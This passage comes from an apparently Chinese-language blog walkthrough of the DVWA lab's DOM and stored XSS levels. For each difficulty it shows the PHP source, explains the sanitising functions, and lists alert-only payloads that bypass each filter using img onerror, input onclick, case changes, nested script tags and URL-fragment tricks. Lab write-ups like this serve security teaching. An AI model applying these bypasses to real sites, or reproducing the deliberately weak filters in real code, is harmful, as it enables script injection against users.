+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'" + lang + "'</span>&gt;</span>" + $decodeURI(lang) + "<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span><br><span class="line">document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span><br></pre></td></tr></table></figure>
+<p>这里的<code>lang</code>变量通过<code>document.location.href</code>来获取到，并且没有任何过滤就直接URL解码后输出在了<code>&lt;option&gt;</code>标签中，以下payload在<code>Firefox Developer Edition 56.0b9</code>版本的浏览器测试成功</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="DOM-XSS-Medium"><a href="#DOM-XSS-Medium" class="headerlink" title="DOM XSS Medium"></a>DOM XSS Medium</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">'default'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对<code>default</code>变量进行了过滤，通过<code>stripos()</code> 函数查找<code>&lt;script</code>字符串在<code>default</code>变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过<code>location</code>将URL后面的参数修正为<code>?default=English</code>，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。</p>
+<p>闭合<code>&lt;option&gt;</code>和<code>&lt;select&gt;</code>，然后使用<code>&lt;img&gt;</code>标签通过事件来弹窗</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>子节点<code>&lt;/option&gt;</code>和父节点<code>&lt;/select&gt;</code>都要闭合<br>直接利用<code>&lt;input&gt;</code>的事件来弹窗</p>
+</blockquote>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English&lt;input onclick=alert(&apos;XSS&apos;) /&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="DOM-XSS-high"><a href="#DOM-XSS-high" class="headerlink" title="DOM XSS high"></a>DOM XSS high</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用了白名单模式，如果<code>default</code>的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:</p>
+<p><code>?default=English</code> ，这里只是对default的变量进行了过滤。</p>
+<p>可以使用<code>&amp;</code>连接另一个自定义变量来Bypass</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">?default=English&amp;a=&lt;input onclick=alert(&apos;XSS&apos;) /&gt;</span><br></pre></td></tr></table></figure>
+<p>也可以使用<code>#</code>来Bypass</p>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">?default=English#&lt;input onclick=alert(&apos;XSS&apos;) /&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="DOM-XSS-Impossible"><a href="#DOM-XSS-Impossible" class="headerlink" title="DOM XSS Impossible"></a>DOM XSS Impossible</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For the impossible level, don't decode the querystring</span></span><br><span class="line">$decodeURI = <span class="string">"decodeURI"</span>;</span><br><span class="line"><span class="keyword">if</span> ($vulnerabilityFile == <span class="string">'impossible.php'</span>) &#123;</span><br><span class="line">    $decodeURI = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>Impossible</code>级别直接不对我们的输入参数进行URL解码了，这样会导致标签失效，从而无法XSS</p>
+<h2 id="存储-XSS-LOW"><a href="#存储-XSS-LOW" class="headerlink" title="存储 XSS LOW"></a>存储 XSS LOW</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p><strong>语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure>
+<p><strong>细节</strong></p>
+<p>移除string字符两侧的预定义字符。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需。规定要检查的字符串。</td>
+</tr>
+<tr>
+<td>charlist</td>
+<td>可选。规定从字符串中删除哪些字符</td>
+</tr>
+</tbody>
+</table>
+<p><code>charlist</code>如果被省略，则移除以下所有字符：</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>\0</td>
+<td>NULL</td>
+</tr>
+<tr>
+<td>\t</td>
+<td>制表符</td>
+</tr>
+<tr>
+<td>\n</td>
+<td>换行</td>
+</tr>
+<tr>
+<td>\x0B</td>
+<td>垂直制表符</td>
+</tr>
+<tr>
+<td>\r</td>
+<td>回车</td>
+</tr>
+<tr>
+<td></td>
+<td>空格</td>
+</tr>
+</tbody>
+</table>
+<h3 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a>stripslashes</h3><p><strong>语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripslashes(string)</span><br></pre></td></tr></table></figure>
+<p><strong>细节</strong></p>
+<p>去除掉string字符的反斜杠<code>\</code>，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
+<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h3><p><strong>语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure>
+<p><strong>细节</strong></p>
+<p>转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">string</td>
+<td style="text-align:left">必需。规定要转义的字符串。</td>
+</tr>
+<tr>
+<td style="text-align:left">connection</td>
+<td style="text-align:left">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
+</tr>
+</tbody>
+</table>
+<p>下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+<p>以上这些函数都只是对数据库进行了防护，却没有考虑到对XSS进行过滤，所以依然可以正常的来XSS</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: sqlsec</span><br><span class="line">Message: &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到我们的payload直接插入到了数据库中了：</p>
+<p><img src="http://qiniuyun.lintstar.top/1555576102908.png" alt="1555576102908"></p>
+<p>测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这条记录。</p>
+<h2 id="存储-XSS-Medium"><a href="#存储-XSS-Medium" class="headerlink" title="存储 XSS Medium"></a>存储 XSS Medium</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h3><p><strong>语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(string)</span><br></pre></td></tr></table></figure>
+<p><strong>细节</strong></p>
+<p>返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<h3 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h3><p><strong>语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure>
+<p><strong>细节</strong></p>
+<p>剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><em>string</em></td>
+<td style="text-align:left">必需。规定要检查的字符串。</td>
+</tr>
+<tr>
+<td style="text-align:left"><em>allow</em></td>
+<td style="text-align:left">可选。规定允许的标签。这些标签不会被删除。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h3><p><strong>语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>
+<p><strong>细节</strong></p>
+<p>把预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<ul>
+<li>&amp; （和号）成为 <code>&amp;</code></li>
+<li>“ （双引号）成为 <code>&quot;</code></li>
+<li>‘ （单引号）成为 ‘</li>
+<li>&lt; （小于）成为 <code>&lt;</code></li>
+<li>> （大于）成为 <code>&gt;</code></li>
+</ul>
+<p><code>message</code> 变量几乎把所有的XSS都给过滤了，但是<code>name</code>变量只是过滤了<code>&lt;script&gt;</code>标签而已，我们依然可以在<code>name</code>参数尝试使用其他的标签配合事件来触发弹窗。</p>
+<p><code>name</code>的input输入文本框限制了长度：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"txtName"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>审查元素手动将<code>maxlength</code>的值调大一点就可以了。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"txtName"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">maxlength</span>=<span class="string">"50"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure>
+<p>可以看到我们的payload直接插入到了数据库中了：</p>
+<p><img src="http://qiniuyun.lintstar.top/1555575984473.png" alt="1555575984473"></p>
+<p>因为<code>name</code>过滤规则的缺陷，同样使用<strong>嵌套构造</strong>和<strong>大小写转换</strong>也是可以Bypass的：</p>
+<p><strong>paylaod2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name: &lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br><span class="line"></span><br><span class="line">Name: &lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure>
+<p>测试完成的话为了不影响下面题目的测试，这里建议手动从数据库中删除下这些记录。</p>
+<h2 id="存储-XSS-high"><a href="#存储-XSS-high" class="headerlink" title="存储 XSS high"></a>存储 XSS high</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>message</code>变量依然是没有什么希望，重点分析下<code>name</code>变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br></pre></td></tr></table></figure>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: &lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">Message: www.sqlsec.com</span><br></pre></td></tr></table></figure>
+<h2 id="存储-XSS-Impossible"><a href="#存储-XSS-Impossible" class="headerlink" title="存储 XSS Impossible"></a>存储 XSS Impossible</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
